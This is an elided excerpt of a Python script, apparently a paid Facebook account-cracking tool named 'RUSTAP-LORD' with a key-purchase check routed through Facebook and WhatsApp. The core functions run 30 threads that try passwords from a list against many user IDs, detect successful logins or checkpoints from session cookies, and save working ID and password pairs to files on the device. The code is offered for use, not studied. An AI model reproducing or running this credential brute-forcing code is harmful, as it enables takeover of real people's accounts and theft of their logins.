#RUSTAP IS THE KING OF ALL CODERS
...
Github    : [ ERROR ]
Facebook  : RUSTAP XWD
Tool Name : RUSTAP-LORD
Tool Type : PAID
Version   : 0.2
----------------------------------------------
THIS IS PAID TOOL - PAY TO USE
RUSTAP XD THE FATHER OF ALL CODERS
\033[1;37m-------------------------------------------- """)
...
def chk():
  ...
  try: 
    ...
    if id in httpCaht: 
      ...
      os.system('xdg-open  https://www.facebook.com/profile.php?id=100084565670977?text=*Hello*%2C%20*Blessing*%20*i*%20*want*%20*to*%20*buy*%20*your*%20*command*%20*apk*%Full Updated*Updated*')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100084565670977');menu()
                        ...
                        url_wa = "https://api.whatsapp.com/send?phone=+9779811586630&text="

                        name = input(" Enter your Name : ")

                        linex()

                        tks = ("Hi Rustap Sir, I Need To Buy Your Paid RUSTAP PRO Tools Version 0.2 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python lord.py')
...
def pak():
                ...
                with tred(max_workers=30) as RUSTAP:     
                        ...
                        for psx in user:
                                ...
                                RUSTAP.submit(rndm,ids,passlist)
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [RUSTAP-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        RUSTAP=session.cookies.get_dict().keys()
                        ...
                        if "c_user" in RUSTAP:
                                ...
                                print('\r\r\033[1;32m [RUSTAP-OK] %s | %s'%(ids,pas))

                                open('/sdcard/RUSTAP-OK.txt', 'a').write(ids+'|'+pas+'\n')

                                oks.append(ids)

                                break

                        elif 'checkpoint' in RUSTAP:

                                if 'y' in pcp:

                                        print('\r\r\x1b[38;5;208m [RUSTAP-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/RUSTAP-CP.txt', 'a').write(ids+'|'+pas+'\n')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [RUSTAP-OK] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/RUSTAP-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [RUSTAP-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/RUSTAP-OK.txt','a').write(uid+'|'+pas+'\n')
